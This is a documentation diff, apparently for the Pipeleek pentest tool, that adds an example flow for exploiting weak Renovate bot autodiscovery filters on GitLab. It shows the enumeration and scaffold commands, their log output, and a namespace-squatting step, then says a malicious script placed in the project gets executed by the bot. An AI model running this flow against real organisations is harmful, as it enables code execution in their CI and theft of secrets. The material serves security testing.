@@ -64,6 +64,22 @@ Examples of vulnerable filter summaries:
 2025-09-30T07:48:31Z info Identified Renovate (bot) configuration autodiscoveryFilterType=autodiscoverFilter autodiscoveryFilterValue="/^acme-org/" autodiscoveryFilterBypass=V4 hasAutodiscovery=true hasAutodiscoveryFilters=true hasConfigFile=true pipelines=private selfHostedConfigFile=false url=https://gitlab.com/acme-org/renovate-config
 ```
 
+Example exploitation flow (V3):
+
+```bash
+# 1) Find a target where Pipeleek reports a vulnerable autodiscovery filter.
+pipeleek gl renovate enum -u https://gitlab.com -t glpat-[redacted]
+2025-09-30T07:48:30Z info Identified Renovate (bot) configuration autodiscoveryFilterType=autodiscoverFilter autodiscoveryFilterValue="/acme-org\/infra/" autodiscoveryFilterBypass=V3 hasAutodiscovery=true hasAutodiscoveryFilters=true hasConfigFile=true pipelines=private selfHostedConfigFile=false url=https://gitlab.com/acme-org/renovate-config
+
+# 2) Create an attacker-controlled repository path that matches the weak filter.
+#    For this example, a squatted namespace like "evil-acme-org/infra-test" can pass V3-style filters.
+
+# 3) Trigger the exploit scaffold and wait for the bot to process your project.
+pipeleek gl renovate autodiscovery -u https://gitlab.com -t glpat-[redacted] -v
+2025-09-30T07:19:33Z info Created project name=devfe-pipeleek-renovate-autodiscovery-poc url=https://gitlab.com/evil-acme-org/infra-test
+2025-09-30T07:19:37Z info Then wait until the created project is renovated by the invited Renovate Bot user
+```
+
 ## 2. Exploit Autodiscovery with a Malicious Project
 
 The Renovate bot from the example above is configured to autodiscover new projects and does not apply any, or only weak, bypassable filters. You can create a repository with a malicious script that gets executed by the bot.
